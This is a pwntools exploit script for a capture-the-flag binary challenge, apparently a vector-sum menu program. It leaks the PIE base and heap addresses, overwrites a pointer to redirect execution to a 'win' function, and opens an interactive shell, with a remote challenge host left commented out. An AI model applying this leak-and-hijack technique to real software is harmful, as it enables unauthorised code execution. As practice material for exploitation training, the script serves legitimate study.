#!/usr/bin/python3
from pwn import *

#context.log_level='debug'
io=process('./chall')
#io=remote('45.122.249.68', 20017)
elf=context.binary=ELF('./chall')
#gdb.attach(io)

def enter(idx, x, y):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', idx)
    io.sendlineafter(b'Enter x: ', x)
    io.sendlineafter(b'Enter y: ', y)
    
def sumVector(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Save the sum to index: ', idx)
    
def printsum():
    io.sendlineafter(b'> ', b'3')
    
def loadfav(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index', idx)
    
def printfav(idx):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index', idx)
    
def addfav(idx):
    io.sendlineafter(b'> ', b'6')
    io.sendlineafter(b'Index', idx)
       
enter(b'0', b'1', b'1')
enter(b'1', b'1', b'1')
enter(b'2', b'1', b'1')

sumVector(b'2')
loadfav(b'2')
printfav(b'2')

io.recvuntil(b'v = [')

leak=io.recvline().strip(b']\n').split()
# print(leak)

pie=int(leak[0])-0x35d
log.info('pie_base :' + hex(pie))

v_list=int(leak[1])-48
log.info('v_list array :' + hex(v_list))

sum=v_list+64
faves=sum+0x18
log.info('sum :' + hex(sum))
log.info('faves :' + hex(faves))

w1n=pie+0x0000000000009D2
system=pie+0x100
log.info('w1n :' + hex(w1n))
log.info('system :' + hex(system))

enter(b'0', str(w1n).encode(), str(w1n).encode())
enter(b'3',str(v_list-16).encode(), str(v_list-16).encode())

printsum() # trigger

#io.sendline(b'exec 1>&0')
io.interactive()
